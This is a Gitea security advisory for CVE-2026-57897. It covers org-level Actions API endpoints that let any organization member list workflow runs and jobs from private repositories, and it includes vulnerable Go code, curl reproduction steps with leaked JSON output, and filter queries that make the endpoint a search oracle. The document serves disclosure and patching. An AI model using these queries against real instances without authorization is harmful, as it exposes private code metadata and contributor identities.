# [M] Gitea: Cross-Repo Information Disclosure via Org-Level Actions Run/Job APIs

## Summary
Severity: Medium
Advisory: GHSA-frpw-3h2q-4jj6
CVE: CVE-2026-57897
CWE: CWE-200, CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-frpw-3h2q-4jj6
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.27.0

## Details
**Author:** Prakhar Porwal
**Date:** 2026-05-24
**Target:** Gitea (self-hosted Git service)
**Branch tested:** `main` @ `b7e95cc48c` (development build, go1.26.3)
**Component:** `routers/api/v1/org/action.go` (org-level Actions API)
**OWASP:** API3:2023 Broken Object Property Level Authorization

---

## 1. Summary

The org-level Actions REST endpoints

```
GET /api/v1/orgs/{org}/actions/runs
GET /api/v1/orgs/{org}/actions/jobs
```

are gated only by **`reqOrgMembership()`** + `reqToken()`. They then call
`shared.ListRuns(ctx, ctx.Org.Organization.ID, 0)` /
`shared.ListJobs(ctx, ctx.Org.Organization.ID, 0, 0, nil)`, which selects
**every** `action_run` / `action_run_job` row whose repository belongs to the
org — with **no per-repository ACL check**.

Result: any user who is a member of an organization can enumerate workflow
runs and jobs from **every repository in that org**, including:

* private repositories the caller has no team membership for,
* repositories where the caller has been explicitly denied the `repo.actions`
  unit,
* repositories created by other teams the caller is not part of.

Direct per-repo equivalents (`GET /api/v1/repos/{owner}/{repo}/actions/runs`,
`…/jobs/{job_id}/logs`, `…/runs/{run_id}/jobs`) correctly return `404` for the
same caller — proving the org-level surface is the only path that leaks.

---

## 2. Affected Code

### 2.1 Route registration

`routers/api/v1/api.go:1647-1652`

```go
addActionsRoutes(
    m,
    reqOrgMembership(),   // reqReaderCheck
    reqOrgOwnership(),    // reqOwnerCheck
    org.NewAction(),
)
```

### 2.2 Helper that registers run/job listing

`routers/api/v1/api.go:908-941`

```go
m.Group("/runs", reqToken(), reqReaderCheck, act.ListWorkflowRuns)
m.Get("/runs", reqToken(), reqReaderCheck, act.ListWorkflowRuns)
m.Get("/jobs", reqToken(), reqReaderCheck, act.ListWorkflowJobs)
```

`reqReaderCheck` for org-scope = `reqOrgMembership()` — bare org membership is
enough; no per-repo permission is consulted.

### 2.3 Handler

`routers/api/v1/org/action.go:595-683`

```go
func (Action) ListWorkflowJobs(ctx *context.APIContext) {
    shared.ListJobs(ctx, ctx.Org.Organization.ID, 0, 0, nil)
}

func (Action) ListWorkflowRuns(ctx *context.APIContext) {
    shared.ListRuns(ctx, ctx.Org.Organization.ID, 0)
}
```

### 2.4 Query construction (no ACL)

`routers/api/v1/shared/action.go:138-215`

```go
opts := actions_model.FindRunOptions{
    OwnerID:     ownerID,   // ← org ID, NOT user ID
    RepoID:      repoID,    // = 0 at org level
    ListOptions: listOptions,
}
…
runs, total, err := db.FindAndCount[actions_model.ActionRun](ctx, opts)
```

`models/actions/run_list.go:102-110`

```go
func (opts FindRunOptions) ToJoins() []db.JoinFunc {
    if opts.OwnerID > 0 {
        return []db.JoinFunc{func(sess db.Engine) error {
            sess.Join("INNER", "repository",
                "repository.id = repo_id AND repository.owner_id = ?", opts.OwnerID)
            return nil
        }}
    }
    return nil
}
```

The join only constrains `repository.owner_id = orgID`. There is no
`access`/`team_repo`/`collaboration` join and no
`access_model.GetDoerRepoPermission(...)` filter — every row in the org is
returned.

The same bug applies to `shared.ListJobs`, which calls
`db.FindAndCount[actions_model.ActionRunJob](ctx, FindRunJobOptions{OwnerID: …})`
using an analogous repository join.

---

## 3. Steps to Reproduce

### 3.1 Setup

* Org **`1st-org`** with one **private** repo `1st-org-repo`.
* Team **`Owners`** contains user **`admin`** (org owner).
* Team **`1st-team`** has **zero repositories** assigned (units permission
  `none` for actions, no included repos).
* User **`admin2`** is a regular user (`is_admin = false`), member of
  `1st-team` only — so org member, but **no team grants any access to
  `1st-org-repo`**.

Verified that admin2 lacks direct access:

```bash
$ curl -u admin2:admin@123 -w '[%{http_code}]\n' \
    http://localhost:3001/api/v1/repos/1st-org/1st-org-repo
{"errors":null,"message":"not found","url":"…"}[404]

$ curl -u admin2:admin@123 -w '[%{http_code}]\n' \
    http://localhost:3001/api/v1/orgs/1st-org/repos
[]
[200]
```

A workflow file was committed to `1st-org-repo/.gitea/workflows/ci.yml` to
produce an `action_run`:

```yaml
name: ci
on: push
jobs:
  hello:
    runs-on: ubuntu-latest
    steps:
      - run: echo "SECRET_INFO_FROM_PRIVATE_REPO"
```

### 3.2 Trigger

```bash
$ curl -u admin2:admin@123 -w '\n[%{http_code}]\n' \
    http://localhost:3001/api/v1/orgs/1st-org/actions/runs
```

**Output (truncated)**

```json
{"workflow_runs":[{
  "id":7,
  "url":"http://localhost:3001/api/v1/repos/1st-org/1st-org-repo/actions/runs/7",
  "html_url":"http://localhost:3001/1st-org/1st-org-repo/actions/runs/7",
  "display_title":"add workflow",
  "path":"ci.yml@refs/heads/main",
  "event":"push",
  "run_attempt":1,
  "run_number":1,
  "head_sha":"b7de30c225eaf5c6e5be1fa1a0dafe5045f90d73",
  "head_branch":"main",
  "status":"queued",
  "actor":{"id":1,"login":"admin", … "email":"1+admin@noreply.localhost", …},
  "trigger_actor":{ … "login":"admin" … },
  "repository":{
     "id":4,"name":"1st-org-repo","full_name":"1st-org/1st-org-repo",
     "description":"test123",
     "private":true,
     "clone_url":"http://localhost:3001/1st-org/1st-org-repo.git",
     "ssh_url":"prakhar@localhost:1st-org/1st-org-repo.git",
     …
  }
}],"total_count":1}
[200]
```

Same primitive for jobs:

```bash
$ curl -u admin2:admin@123 -w '\n[%{http_code}]\n' \
    http://localhost:3001/api/v1/orgs/1st-org/actions/jobs
{"jobs":[{
  "id":7,
  "run_id":7,
  "name":"hello",
  "labels":["ubuntu-latest"],
  "head_sha":"b7de30c225eaf5c6e5be1fa1a0dafe5045f90d73",
  "head_branch":"main",
  "status":"queued",
  …
}],"total_count":1}
[200]
```

### 3.3 search primitives

All query parameters supported by `ListRuns`/`ListJobs` work too — turning the
endpoint into a **search oracle** over private workflow metadata:

```bash
# Find runs on a specific branch in private repos:
curl -u admin2:… "http://localhost:3001/api/v1/orgs/1st-org/actions/runs?branch=main"

# Confirm a given commit SHA exists in any private repo of the org:
curl -u admin2:… "http://localhost:3001/api/v1/orgs/1st-org/actions/runs?head_sha=b7de30c2…"

# Filter by actor:
curl -u admin2:… "http://localhost:3001/api/v1/orgs/1st-org/actions/runs?actor=admin"

# Filter by event/status:
curl -u admin2:… "http://localhost:3001/api/v1/orgs/1st-org/actions/runs?event=push&status=failure"
```

All return matching rows from private repos in the org.


---


## 4. Impact

A low-privileged authenticated org member (no team, no repo permission, no
admin) gains, for every private repository in the org:

| Field leaked                  | Why it matters                                      |
|-------------------------------|------------------------------------------------------|
| `repository.full_name`, `description`, `private`, clone URLs | Existence + topology of private repos |
| `head_sha`, `head_branch`     | Confirms commits / branch names exist in private repos |
| `path` (workflow file)        | Reveals workflow YAML filenames                      |
| `event`, `display_title`      | Commit messages / event types                        |
| `actor`, `trigger_actor`      | Internal contributor identities incl. noreply emails |
| `created_at`, `started_at`    | Activity timing / CI cadence                         |
| Pagination + `?head_sha=`/`?branch=`/`?actor=` filters | Full **search oracle** over private workflow history |

Real-world consequences:

1. **Org reconnaissance** — confirms existence of private projects, names,
   activity patterns; commit messages and branch names often reveal product
   plans, security fix windows, or release schedules.
2. **Insider-threat amplification** — any contractor / interviewee / OSS
   contributor invited to a low-permission team can mine the rest of the
   org's CI history.
3. **Cross-team violation** — when an org isolates internal projects via
   teams (e.g. `security/` vs `infra/` teams), this surface flatly bypasses
   that boundary.
4. **Pivot data** — commit SHAs disclosed here unlock subsequent endpoints
   that *do* check ACLs but accept SHA inputs (e.g. some package / archive
   download paths in third-party tooling that just trusts a SHA).

The same primitive is exposed regardless of token scope, as long as the token
has `organization` scope, the user is an org member, and the org has any
private repos with action runs.

---

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-frpw-3h2q-4jj6
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.27.0
